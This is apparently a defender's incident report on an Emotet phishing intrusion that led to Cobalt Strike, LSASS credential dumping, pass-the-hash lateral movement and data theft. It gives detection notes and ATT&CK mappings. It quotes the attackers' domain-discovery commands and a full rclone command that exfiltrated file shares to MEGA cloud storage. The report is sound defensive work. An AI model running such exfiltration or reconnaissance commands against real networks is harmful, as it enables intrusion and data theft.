# Case Summary

Back in May, we witnessed an intrusion that started from a phishing email which included Emotet. The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework.

The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months. After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers.

Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign. This entailed connecting to various email servers and sending new emails with attached xls and zip files. This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again.

Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host. Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder. Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS. Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast.

At 29 hours from initial access, the threat actors began their first lateral movement. This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation. From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat. Pass-the-Hash behavior was observed targeting several accounts on the lateral host. Use of Cobalt Strike’s Get-System module was also apparent via the logs.

The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network. More account discovery was then observed, with queries for Domain Administrators and a backup account.

At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL. Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS. After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera–for an additional means of persistence and command and control. During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC.

They returned the next day, at the same time as the previous day, and picked up where they left off. They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer. Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers. Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA. Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter –ignore-existing from two different hosts on the network. Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC.

On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server. This was the last activity we observed from this group. These cases commonly end up with ransomware in addition to data exfiltration. This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken.

# Analysis

The threat actor gained access to the environment after a user opened an Excel document and enabled macros. The document came in via email in the form of a zip file which included an xls file. Thanks for sharing @proxylife!





Mixture of lnk files and xls files being sent. I am playing catching up updating my git with IOC's!

The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.

To deobfuscate the document the tool xlmdeobfuscator was used with the following output.

After deobfuscation and cleaned up, the code in the macro looks as follows.


# Execution

# Emotet Execution

The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll . Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs.

A new file is then created in C:\%USERPROFILE%\AppData\Local\ with a folder that also consists of random characters.

# Cobalt Strike Execution

The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost.

Sysmon showing Emotet starting the Cobalt Strike executable.

A great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens’s fantastic tool 1768.py. Here, the tool is used with a process dump of the executable.

# Persistence

The Emotet malware infection on the beachhead host used a registry run key to maintain persistence.

This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion.

Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons.

# Privilege Escalation

Use of Cobalt Strike’s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges.

# Defense Evasion

Process injection was observed during the intrusion by both Emotet and Cobalt Strike. Emotet injected multiple times into svchost to execute certain functions, including discovery commands.

Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process. We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads.

Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule.

# Credential Access

From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host. Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes.

Shortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoast looking for roastable accounts within the organization.

We observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.

# Discovery

On the first day of the intrusion, the Emotet malware performed some basic discovery tasks on the host using built in Windows utilities.

systeminfo ipconfig /all

On the second day, the hands on activity from Cobalt Strike performed a more thorough examination of that host’s Windows domain.

C:\Windows\system32\cmd.exe /C net group "Domain Computers" /domain C:\Windows\system32\cmd.exe /C net group /domain "Domain Admins" C:\Windows\system32\cmd.exe /C net group /domain "Enterprise Admins" C:\Windows\system32\cmd.exe /C systeminfo C:\Windows\system32\cmd.exe /C net users C:\Windows\system32\cmd.exe /C nltest /DOMAIN_TRUSTS

The threat actors launched the PowerView module, Invoke-Sharefinder, from almost all of the hosts to which they pivoted, including the domain controller.

AdFind.exe, the command-line Active Directory query tool, was run on only one of the compromised hosts via the find.bat batch script. The contents of the script are below:




Using the data collected from previous activity, they created a target list which was then fed to a batch script named p.bat. The batch file contained one line, which pinged a list of servers (servers.txt). The line can be seen below:



Additionally, the threat actors displayed the share directories using dir.exe via the interactive shell from the Cobalt Strike beacon.

# Lateral Movement

The Cobalt Strike jump psexec (Run service EXE on the remote host) produced a 7045 System Windows event on remote hosts. Example:

Below, the network traffic shows the SMB lateral transfer of one of the Atera Agent MSI installers (1.msi) used to gain access laterally on a host and provide persistence for later access.

The same can be observed for other payloads used during the intrusion as well; here we can see that same data using Zeek logs when the threat actors transferred the 1.dll Cobalt Strike beacon laterally to gain access to additional hosts.

We also observed Pass-The-Hash used throughout the intrusion via the Cobalt Strike Beacons. Threat actors used PTH to acquire a session with elevated user access. We observed the below logs being generated on the source host and domain controller that indicate the use of PTH.

Source Host:

- Windows EID 4624 Logon Type = 9 Authentication Package = Negotiate Logon Process = seclogo - Windows EID 467

Domain Controller:

- Windows EID 4776

You can read more about detecting “Pass-The-Hash” here by Stealthbits and here by Hausec.

# Command and Control

# Emotet

In the Emotet Excel document, the following URLs are hard coded, and obfuscated, to download the second stage.


The second stage of Emotet has a set of hard-coded IPs that it tries to connect to after the DLL is executed.

# Cobalt Strike

Emotet, later on, deployed Cobalt Strike for additional functionality.

# Atera and Splashtop

Threat actors used Atera and Splashtop remote access tools on two compromised hosts during the intrusion. Atera granted the threat actors with interactive access. We cannot, however, confirm that the threat actors utilized this access because the majority of activity originated through the Cobalt Strike beacons.

# Exfiltration

The threat actors used Rclone to exfiltrate sensitive data to MEGA.io cloud storage. Command line logging revealed the destination to be the Mega service and the network shares targeted.

rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4

This activity was also visible on the network via Zeek logs showing the SMB share connection activity.

# Actions on Objectives

Emotet has for some time been used as an initial access broker for various intrusions; however, some Emotet infections get tasked with continuing the delivery of new campaigns. In this intrusion, we observed both tasks occurring during the same time with both the delivery of access to the threat actor utilizing Cobalt Strike and exfiltrating data from the network, all the while, the original Emotet malware was tasked to deliver new malicious emails.

The Emotet mailer started roughly once each day during the intrusion. Marked by bursts of connection to various email servers.

The emails were sent through various compromised email accounts, propagating additional malicious xls files to further propagate Emotet access.

We did not see any further activity but we believe if given enough time, this would have ended with domain wide ransomware. We have a case coming up in a few weeks where it does exactly that.

# MITRE ATT&CK DATASET
Dynamic-link Library Injection - T1055.001 Component Object Model - T1559.001 PowerShell - T1059.001 Regsvr32 - T1218.010 Pass the Hash - T1550.002 Domain Groups - T1069.002 Domain Account - T1087.002 Domain Trust Discovery - T1482 Malicious File - T1204.002 SMB/Windows Admin Shares - T1021.002 Lateral Tool Transfer - T1570 Process Injection - T1055 Exfiltration to Cloud Storage - T1567.002 Thread Execution Hijacking - T1055.003 Remote System Discovery - T1018 System Information Discovery - T1082 Application Layer Protocol - T1071 Network Share Discovery - T1135 Kerberoasting - T1558.003 LSASS Memory - T1003.001 Registry Run Keys / Startup Folder - T1547.001 Phishing - T1566 Spearphishing Attachment - T1566.001
